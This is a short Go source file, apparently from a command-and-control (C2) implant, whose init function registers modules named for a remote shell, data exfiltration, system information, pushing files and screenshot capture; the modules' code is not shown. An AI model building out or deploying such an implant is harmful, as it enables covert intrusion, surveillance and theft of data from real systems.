//go:build !noscreenshot

package c2

func init() {
	RegisterModule(&ShellModule{})
	RegisterModule(&ExfilModule{})
	RegisterModule(&SysinfoModule{})
	RegisterModule(&PushModule{})
	RegisterModule(&ScreenshotModule{})
}
